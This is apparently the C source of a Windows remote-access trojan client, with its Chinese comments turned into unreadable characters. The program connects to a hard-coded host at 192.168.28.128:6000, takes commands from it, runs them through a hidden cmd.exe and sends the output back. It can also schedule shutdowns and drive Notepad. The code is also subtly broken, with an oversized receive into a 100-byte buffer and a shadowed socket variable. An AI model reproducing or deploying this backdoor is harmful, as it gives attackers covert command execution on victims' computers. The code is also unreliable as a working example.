//��2��ľ��ͻ��˳���
#include <Winsock2.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32.lib")	//��̬����һ��lib�ļ�,Ҳ���ǿ��ļ�
#include <stdlib.h>
#include<tchar.h>	//������˫�ֽ��ַ�����ʹ����������ڶ����������ִ���
#include <windows.h>
#include <string>
#include <tlhelp32.h> 
#include<time.h>


#define MSG_LEN 1024

PROCESS_INFORMATION process_info;	//���ñر����� process_info,����������Ľ��������Ϣ

SOCKET sockClient; // �ͻ��� Scoket
HANDLE hRead;		//�ƶ�һ�����



bool IsProcessRun(char *pName)	//�жϵ�ǰ�����Ƿ��Ѵ��ڻʵ��
{
	//--------------------��ʼ��--------------------
	HANDLE hProcessSnap = NULL;
	HANDLE hProcess;
	PROCESSENTRY32 pe32;//PROCESSENTRY32�ǽ��̿��յĽṹ��
	DWORD dwPriorityClass;
	int count = 0;
	//--------------------��ʼ��end--------------------

	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);	//��ϵͳ�����еĽ����Ŀ���
	if (hProcessSnap == INVALID_HANDLE_VALUE)	//����ʧ��
	{
		return false;
	}

	pe32.dwSize = sizeof(PROCESSENTRY32);//ʵ������ʹ��Process32First��ȡ��һ�����յĽ���ǰ�����ĳ�ʼ������

	int jud = Process32Next(hProcessSnap, &pe32);	 // �������̿��գ�������ʾÿ�����̵���Ϣ
	while (jud)
	{
		dwPriorityClass = 0;
		if (_stricmp(pName , pe32.szExeFile) == 0)
		{
			count++;
		}
		jud = Process32Next(hProcessSnap, &pe32);
	}
	if (count >= 1)
	{
		return true;
	}
	else
	{
		return false;
	}

}
int createproc1()	//����ⲿ���򷵻�ֵ
{
	STARTUPINFO si1 = { sizeof(si1) };	//��cb��Ա��ʼ��Ϊsizeof(si)��������Ա��ʼ��Ϊ0
	PROCESS_INFORMATION pi1;	//���ñر�����pi1,����������Ľ��������Ϣ
	ZeroMemory(&pi1, sizeof(pi1));	//��ָ�����ڴ������
	ZeroMemory(&si1, sizeof(si1));
	TCHAR szCommandLine1[] = TEXT("101010.exe");	//?
	si1.wShowWindow = TRUE;	//�˳�Ա��ΪTRUE�Ļ�����ʾ�½����̵�������
	CreateProcess(szCommandLine1, NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &si1, &pi1);	//����һ���½���  
	return 0;
}




void post(char *msg)
{
    send(sockClient, msg, strlen(msg) + 1, 0);
    
}
 
DWORD WINAPI ThreadProc (LPVOID lpThreadParameter)
{
    char buf[2048] = {0};    //������
    DWORD len = 0;
    
   
    while (ReadFile( hRead, buf, MSG_LEN, &len, NULL ))	 // ���ܵ�����,����ʾ
    {
        post( buf );
        ZeroMemory( buf, MSG_LEN );
        Sleep(800);
    }
    CloseHandle( hRead );
    return 0;
}
 
int cmd(char *cmdStr, char *message)
{
    char command[1024] = {0};
    char buf[MSG_LEN] = {0};    //������
 
    HANDLE hWrite;
    STARTUPINFO si;         // ����������Ϣ
    PROCESS_INFORMATION pi; // ������Ϣ
    SECURITY_ATTRIBUTES sa; // �ܵ���ȫ����
 
    DWORD Tid;
 
    
    sprintf(command, "cmd.exe /c %s", cmdStr);	// ƴ�� cmd ����
    
 
    // --------------------���ùܵ���ȫ����--------------------
    sa.nLength = sizeof( sa );
    sa.bInheritHandle = TRUE; // �ܵ�����ǿɱ��̳е�
    sa.lpSecurityDescriptor = NULL;
   // --------------------���ùܵ���ȫ����end--------------------

    
    if( !CreatePipe(&hRead, &hWrite, &sa, 1024))	// ���������ܵ����ܵ�����ǿɱ��̳е�
    {
        printf( "�ܵ�����ʧ��! Error: %x\n", (unsigned int)GetLastError() );	//����ʧ��
        return 1;
    }
 
    // --------------------���� cmd ������Ϣ--------------------
    ZeroMemory( &si, sizeof( si ) );
    si.cb = sizeof( si ); // ��ȡ���ݴ�С
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; // ��׼�����ʹ�ö����
    si.wShowWindow = SW_HIDE;               // ���ش�������
    si.hStdOutput = si.hStdError = hWrite;  // ������ʹ�����ָ��ܵ�д��һͷ
    // --------------------���� cmd ������Ϣend--------------------

   
    if ( !CreateProcess(	 // �����ӽ���,��������,�ӽ����ǿɼ̳е�
        NULL,       // ��������·��, ʹ��������    
        command,    // ����������        
        NULL,        
        NULL,        
        TRUE,      
        0,          
        NULL,       
        NULL,       
        &si,        // STARTUPINFO �ṹ�洢������Ϣ
        &pi ) )     // PROCESS_INFORMATION ����������Ľ��������Ϣ 
    {
        printf( "��������ʧ��! Error: %x\n", (unsigned int)GetLastError() );
        CloseHandle( hRead );
        CloseHandle( hWrite );
        return 1;
    }
     
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle( hWrite );
 
    CreateThread(
        NULL,       // ���ܱ��ӽ��̼̳�
        0,          // Ĭ�϶�ջ��С
        ThreadProc, // �̵߳��ú�������
        hRead,      // ���ݲ���
        0,          // ����������ִ��
        &Tid        // ���洴������߳�ID
    );
 
    // TODO:: ������һ���߳�
 
    return 0;
}

BOOL CreateNotepad()
{
    BOOL flag;
    STARTUPINFO start_info;	////STARTUPINFO ��һ���ṹ�壬�ýṹ����ָ���½��̵�����������;start_infoΪ����ı���
 
    ZeroMemory( &process_info, sizeof(process_info) );
    ZeroMemory( &start_info, sizeof(start_info) );
 
    start_info.cb = sizeof(start_info);
 
    flag = CreateProcess( 
        NULL,           // ��������·��, ʹ��������
        "notepad.exe",  // ����������
        NULL,           // ���̳н��̾��(Ĭ��)
        NULL,           // ���̳��߳̾��(Ĭ��)
        FALSE,          // ���̳о��(Ĭ��)
        0,              // û�д�����־(Ĭ��)
        NULL,           // ʹ��Ĭ�ϻ�������
        NULL,           // ʹ�ø����̵�Ŀ¼
        &start_info,    // STARTUPINFO �ṹ
        &process_info );// PROCESS_INFORMATION ���������Ϣ
 
    if ( !flag )
    {
        printf( "����ʧ�� Error: (%d).\n", GetLastError() );
        return 0;
    }
    return 1;
}
 
/*
  ���ַ���д�����±��� RichEdit �ؼ���
 */
void WriteNotepadText(char *str)
{
    char text[250];
    HWND hNotepad = FindWindow(TEXT("Notepad"), NULL);
    HWND hEdit = FindWindowEx(hNotepad, NULL, TEXT("Edit"), NULL);
    wsprintf(text, "%s\r\n", str);
    SendMessage(hEdit, EM_REPLACESEL, NULL, (LPARAM)text);
}
 
/*
  �رռ��±�
 */
void CloseNotepad()		// �رս��̾�����߳̾��
{
    
    DWORD dwDesiredAccess = PROCESS_TERMINATE;	//����ѡ��,PROCESS_TERMINATE����һ��������ǿ�ƽ��������Ľ��̵ı�־
    BOOL  bInheritHandle  = FALSE;	//�ܷ�̳�; True ��ʾ���� CreateProcess �̳о�������½���
    HANDLE hProcess = OpenProcess(dwDesiredAccess, bInheritHandle, process_info.dwProcessId);	//���ؽ��̵ľ��
    if (hProcess == NULL)
        return;
    TerminateProcess(hProcess, 0);	//ǿ�ƽ�����������
    CloseHandle(hProcess);
}
 
/*
  �ж� text �ַ����Ƿ��� begin �ַ�����ͷ
 */
BOOL strstart(char *text, char *begin)
{
    while(*begin)
        if (*begin++ != *text++)
            return FALSE;
    return TRUE;
}

int run(char *recvCmd, char *message)
{
    if (strcmp(recvCmd, "test") == 0)
    {
        strcpy(message, "�������ã���ʲô����~");
    }
    else if (strcmp(recvCmd, "shutdown") == 0)
    {
        
        system("shutdown -s -t 1800");		// ִ�йػ�����趨ʱ�ػ�
        strcpy(message, "�ͻ��˽��� 30 ���Ӻ�ر�");
    }
    else if (strcmp(recvCmd, "cancel") == 0)
    {
       
        system("shutdown -a");		 // ע���ػ�����
        strcpy(message, "�ͻ��˶�ʱ�ػ���ȡ��");
    }

	else if (strcmp(recvCmd, "open") == 0)
    {
        if(CreateNotepad())
        {
            strcpy(message, "���±������ɹ�");
        } else {
            strcpy(message, "���±�����ʧ��!");
        }
    }
    else if (strcmp(recvCmd, "close") == 0)
    {
        CloseNotepad();
        strcpy(message, "Closed.");
    }
    else if (strstart(recvCmd, "write"))
    {
        WriteNotepadText(recvCmd + sizeof("write"));
        strcpy(message, "send");
    }

    else if (strcmp(recvCmd, "exit") == 0)
    {
        return 1;
    }
    else
    {
        
        cmd(recvCmd, message);	// ���� cmd
    }
    return 0;
}
void main()
{
    int err = 0;
    char message[MSG_LEN] = {0};
    char recvCmd[100] = {0};
 
    SOCKET sockClient; // �ͻ��� Scoket
    SOCKADDR_IN addrServer; // ����˵�ַ
 
    WSADATA wsaData;
    WORD wVersionRequested;
 
    wVersionRequested = MAKEWORD( 2, 2 );
 
    err = WSAStartup( wVersionRequested, &wsaData );
 
    if ( err != 0 )
    {
        return;
    }
 
    if ( LOBYTE( wsaData.wVersion ) != 2 || HIBYTE( wsaData.wVersion ) != 2 )
    {
        // �������󣬳������
        WSACleanup( );
        return;
    }
 
    // �½��ͻ��� scoket
    sockClient = socket(AF_INET, SOCK_STREAM, 0);
 
    // ����Ҫ���ӵķ���˵�ַ
    addrServer.sin_addr.S_un.S_addr = inet_addr("192.168.28.128");  // Ŀ��IP (127.0.0.1�Ǳ�����ַ)
    addrServer.sin_family = AF_INET;                           // Э��������INET
    addrServer.sin_port = htons(6000);                         // ���Ӷ˿�1234
 
    // �� sockClient ���ӵ� �����
    connect(sockClient, (SOCKADDR *)&addrServer, sizeof(SOCKADDR));
 
    while(1)
    {
        // ����ַ���
        ZeroMemory(recvCmd, sizeof(recvCmd));
        ZeroMemory(message, sizeof(message));
        // �ӷ���˻�ȡ����
        recv(sockClient, recvCmd, MSG_LEN, 0);
        // ��ӡ����
        printf("-- �յ�����: [%s]n", recvCmd);
 
        run(recvCmd, message);
 
        if (strlen(recvCmd) > 0)
        {
            // �������ݵ������
            send(sockClient, message, strlen(message) + 1, 0);
        }
    }
 
    // �ر�socket
    closesocket(sockClient);
    WSACleanup();
}
